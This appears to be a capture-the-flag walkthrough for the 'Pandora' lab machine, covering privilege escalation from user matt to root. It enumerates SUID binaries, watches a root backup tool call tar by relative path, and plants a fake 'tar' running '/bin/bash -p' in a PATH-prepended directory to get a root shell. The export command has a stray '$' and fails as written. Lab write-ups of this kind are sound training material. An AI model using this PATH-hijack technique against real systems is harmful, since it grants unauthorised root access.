- First, a proper session is required for this exploit so get an ssh session as matt
- Now find suid files that matt has access to
```bash
matt@pandora:/dev/shm$ find / -perm /4000 -ls 2>/dev/null                                                                                                    │
   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo                                                                        │
   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec                                                                      │
   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn                                                                        │
   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp                                                                      │
   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd                                                                     │
   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount                                                                      │
   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3 15:58 /usr/bin/pandora_backup                                                              │
   267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
   [TRUNCATED]
```
- The pandora_backup bin is unique and it has the root suid
- with pspy running, try running the binary
```bash
2022/04/23 18:28:49 CMD: UID=0    PID=2358   | /usr/bin/pandora_backup         
2022/04/23 18:28:49 CMD: UID=0    PID=2360   | tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/AAAAA [TRUNCATED]
2022/04/23 18:28:49 CMD: UID=0    PID=2359   | sh -c tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
- The important part here is the bottom command which is what the backup file is running
- Notice that the path for tar is not absolute -> vulnerable to path corruption
	- Add writeable directory to beginning of path
	- Create a file called tar, make it executable, add a shell payload to the shell
	- Go to added directory and run the suid binary
```bash
# add dir to path
matt@pandora:/dev/shm$ export $PATH=/dev/shm:$PATH

# add malicious tar file & make executable
matt@pandora:/dev/shm$ echo '/bin/bash -p' > tar
matt@pandora:/dev/shm$ chmod +x tar

# run the suid bin and get shell as root
matt@pandora:/dev/shm$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/dev/shm# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```